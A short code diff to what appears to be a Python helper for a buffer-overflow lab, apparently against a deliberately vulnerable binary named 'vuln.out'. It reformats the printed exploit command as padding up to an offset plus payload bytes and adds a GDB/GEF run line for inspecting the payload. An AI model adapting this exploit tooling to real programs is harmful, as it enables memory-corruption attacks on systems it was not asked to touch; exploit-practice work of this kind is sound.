@@ -45,8 +45,18 @@ def main():
     print()
     print("Run this to fire the exploit:")
     print()
+    payload_expression = f"b'A'*{OFFSET} + {payload[OFFSET:]!r}"
     print("python3 -c \"import subprocess; subprocess.run(['./vuln.out', "
-          f"{payload!r}])\"")
+            f"{payload_expression}])\"")
+    print()
+    print("Run this at the GEF prompt to inspect the payload:")
+    gdb_command = (
+        "run $(python3 -c 'import sys; "
+        f'sys.stdout.buffer.write(b"A"*{OFFSET} + '
+        f'bytes.fromhex("{payload[OFFSET:].hex()}"))'
+        "')"
+    )
+    print(gdb_command)
 
 
 if __name__ == "__main__":
